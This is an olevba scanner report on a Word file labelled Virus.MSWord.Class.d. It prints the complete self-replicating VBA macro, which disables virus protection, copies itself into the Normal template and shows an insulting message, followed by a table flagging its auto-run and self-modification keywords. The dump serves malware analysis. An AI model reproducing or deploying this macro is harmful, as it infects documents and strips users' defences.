olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-673088627a430d4b982102df02c9e09f85ba20c1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-673088627a430d4b982102df02c9e09f85ba20c1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Tester2/26/01 11:50:02 AMtest.doc
On Error GoTo out
'Tester2/26/01 11:50:02 AMtest.doc
Options.VirusProtection = False
'Tester2/26/01 11:50:02 AMtest.doc
Options.SaveNormalPrompt = False
'Tester2/26/01 11:50:02 AMtest.doc
Options.ConfirmConversions = False
'Tester2/26/01 11:50:02 AMtest.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Tester2/26/01 11:50:02 AMtest.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Tester2/26/01 11:50:02 AMtest.doc
If nt > 70 And ad > 0 Then GoTo out
'Tester2/26/01 11:50:02 AMtest.doc
If nt < 70 Then
'Tester2/26/01 11:50:02 AMtest.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tester2/26/01 11:50:02 AMtest.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tester2/26/01 11:50:02 AMtest.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tester2/26/01 11:50:02 AMtest.doc
End If
'Tester2/26/01 11:50:02 AMtest.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tester2/26/01 11:50:02 AMtest.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Tester2/26/01 11:50:02 AMtest.doc
host.CodeModule.AddFromFile ("c:\class.sys")
'Tester2/26/01 11:50:02 AMtest.doc
With host.CodeModule
'Tester2/26/01 11:50:02 AMtest.doc
    For x = 1 To 4
'Tester2/26/01 11:50:02 AMtest.doc
    .deletelines 1
'Tester2/26/01 11:50:02 AMtest.doc
    Next x
'Tester2/26/01 11:50:02 AMtest.doc
End With
'Tester2/26/01 11:50:02 AMtest.doc
If nt < 70 Then
'Tester2/26/01 11:50:02 AMtest.doc
    With host.CodeModule
'Tester2/26/01 11:50:02 AMtest.doc
    .replaceline 1, "Sub AutoClose()"
'Tester2/26/01 11:50:02 AMtest.doc
    .replaceline 91, "Sub ToolsMacro()"
'Tester2/26/01 11:50:02 AMtest.doc
    For x = 70 To 81
'Tester2/26/01 11:50:02 AMtest.doc
        .deletelines 62
'Tester2/26/01 11:50:02 AMtest.doc
    Next x
'Tester2/26/01 11:50:02 AMtest.doc
    .replaceline 35, "    For x = 1 To 4"
'Tester2/26/01 11:50:02 AMtest.doc
    End With
'Tester2/26/01 11:50:02 AMtest.doc
End If
'Tester2/26/01 11:50:02 AMtest.doc
With host.CodeModule
'Tester2/26/01 11:50:02 AMtest.doc
    For x = 2 To 104 Step 2
'Tester2/26/01 11:50:02 AMtest.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/26/01 11:50:02 AMtest.doc
    Next x
'Tester2/26/01 11:50:02 AMtest.doc
End With
'Tester2/26/01 11:50:02 AMtest.doc
out:
'Tester2/26/01 11:50:02 AMtest.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/26/01 11:50:02 AMtest.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

